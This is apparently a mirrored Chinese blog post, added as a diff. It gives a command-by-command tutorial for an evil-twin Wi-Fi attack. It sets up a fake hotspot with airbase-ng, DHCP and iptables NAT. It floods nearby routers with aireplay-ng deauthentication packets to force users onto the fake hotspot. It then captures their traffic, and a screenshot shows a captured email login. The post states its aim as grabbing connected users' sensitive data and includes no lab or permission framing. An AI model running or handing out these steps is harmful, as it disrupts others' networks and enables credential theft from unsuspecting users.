@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/fake-wifi-access-point-and-capture-all-data/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:47:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>创建假的wifi热点</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="本帖介绍怎么创建假的wifi热点，然后抓取连接到这个wifi用户的敏感数据。我们还会给周围的无线路由器发送未认证的包，使这些路由器瘫痪，强迫用户连接（或自动连接）我们创建的假wifi热点。
+
+" />
+    <meta property="og:description" content="本帖介绍怎么创建假的wifi热点，然后抓取连接到这个wifi用户的敏感数据。我们还会给周围的无线路由器发送未认证的包，使这些路由器瘫痪，强迫用户连接（或自动连接）我们创建的假wifi热点。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="创建假的wifi热点" />
+    <meta property="twitter:title" content="创建假的wifi热点" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>创建假的wifi热点</h1>
+
+  <div class="entry">
+    <p>本帖介绍怎么创建假的wifi热点，然后抓取连接到这个wifi用户的敏感数据。我们还会给周围的无线路由器发送未认证的包，使这些路由器瘫痪，强迫用户连接（或自动连接）我们创建的假wifi热点。</p>
+
+<p>这种攻击也叫”水坑攻击”－把其他用户都聚集到一个”坑”中。</p>
+
+<h2 id="系统要求">系统要求：</h2>
+
+<ul>
+  <li>Kali Linux</li>
+  <li>本地有线网络连接（网络接口 eth0）</li>
+  <li>无线网卡支持包注入模式和监控模式 （网络接口 wlan0）</li>
+  <li>各种抓包工具－Wireshark、 ettercap、tcpdump…</li>
+</ul>
+
+<h3 id="获得默认网关">获得默认网关</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># route -n</span></code></pre></figure>
+
+<p><img src="../images/2016/5/Screen%20Shot%202016-05-23%20at%2018.50.18.png" alt="创建假的wifi热点" /></p>
+
+<p>这个值在设置iptables时会用到。</p>
+
+<h3 id="安装dhcp服务">安装DHCP服务</h3>
+
+<p>用处: 为连接假wifi的用户分配IP。</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># apt-get install isc-dhcp-server</span></code></pre></figure>
+
+<p>配置DHCP：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># vim /etc/dhcp/dhcpd.conf</span></code></pre></figure>
+
+<p>文件中内容：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet 192.168.10.0 netmask 255.255.255.0 {
+   option routers 192.168.10.1;
+   option subnet-mask 255.255.255.0;
+   option domain-name "freewifi";
+   option domain-name-servers 8.8.8.8,8.8.4.4,192.168.0.1;
+   range 192.168.10.100 192.168.10.140;
+}
+</code></pre>
+</div>
+
+<p>先不启动DHCP服务。</p>
+
+<h3 id="进入无线网卡的监控模式">进入无线网卡的监控模式</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airmon-ng start wlan0</span>
+<span class="c"># airmon-ng check kill</span></code></pre></figure>
+
+<p>把wlan0替换为你的无线网卡接口。</p>
+
+<p>要退出监控模式，执行：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airmon-ng stop wlan0mon</span></code></pre></figure>
+
+<h3 id="创建wifi热点">创建wifi热点</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airbase-ng -c 11 -e fake_wifi wlan0mon</span></code></pre></figure>
+
+<p><img src="../images/2016/5/Screen%20Shot%202016-05-24%20at%2009.06.55.png" alt="创建假的wifi热点" /></p>
+
+<p>不要终止这个命令。</p>
+
+<p><img src="../images/2016/5/Screen%20Shot%202016-05-24%20at%2009.20.04.png" alt="创建假的wifi热点" /></p>
+
+<p>现在你已经创建了一个wifi热点，但是这个wifi目前还不能连接。</p>
+
+<h3 id="设置网络和防火墙规则">设置网络和防火墙规则</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># ifconfig at0 up
+# ifconfig at0 192.168.10.1 netmask 255.255.255.0
+# ifconfig at0 mtu 1400
+# route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1
+# iptables --flush
+# iptables --table nat --flush
+# iptables --delete-chain
+# iptables --table nat --delete-chain
+# echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+# iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
+# iptables -P FORWARD ACCEPT
+# iptables --append FORWARD --in-interface at0 -j ACCEPT
+# iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+</code></pre>
+</div>
+
+<h3 id="启动dhcp服务">启动DHCP服务</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0</span>
+<span class="c"># systemctl start isc-dhcp-server</span></code></pre></figure>
+
+<p>遇到的问题：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>PID file: /var/run/dhcpd.pid
+Can't open lease database /var/lib/dhcp/dhcpd.leases: No such file or directory --
+</code></pre>
+</div>
+
+<p>创建这个文件解决这个问题：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># mkdir /var/lib/dhcp/</span>
+<span class="c"># touch /var/lib/dhcp/dhcpd.leases</span></code></pre></figure>
+
+<p>到此，wifi热点创建完成。</p>
+
+<p><img src="../images/2016/5/S60524-201256.jpg" alt="创建假的wifi热点" /></p>
+
+<p><img src="../images/2016/5/S60524-201355.jpg" alt="创建假的wifi热点" /></p>
+
+<h3 id="瘫痪其他路由">瘫痪其他路由</h3>
+
+<p>列出周围的wifi：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airodump-ng wlan0mon</span></code></pre></figure>
+
+<p>然后选择你的目标，记住BSSID和频道。</p>
+
+<p>设置频道：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># iwconfig wlan0mon channel &lt;频道号&gt;</span></code></pre></figure>
+
+<p>开始deauthentication攻击：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># aireplay-ng -0 5000 -a &lt;BSSID&gt; wlan0mon --ignore-negative-one</span></code></pre></figure>
+
+<hr />
+
+<p>OK，现在你可以愉快的抓包了。</p>
+
+<hr />
+
+<p>例如使用Wireshark抓包：</p>
+
+<p><img src="../images/2016/5/Screenshot%20from%202016-05-24%2020-12-12.png" alt="创建假的wifi热点" /></p>
+
+<p>上图抓到了我手机邮件客户端登录的邮箱账户。</p>
+
+<hr />
+
+<blockquote>
+  <p>更多：<a href="https://github.com/tiancode/learn-hacking">https://github.com/tiancode/learn-hacking</a></p>
+</blockquote>
+
+  </div>
+
+  <div class="date">
+    Written on May 24, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/fake-wifi-access-point-and-capture-all-data/',
+		  'title': '创建假的wifi热点'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/fake-wifi-access-point-and-capture-all-data/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:47:46 GMT -->
+</html>
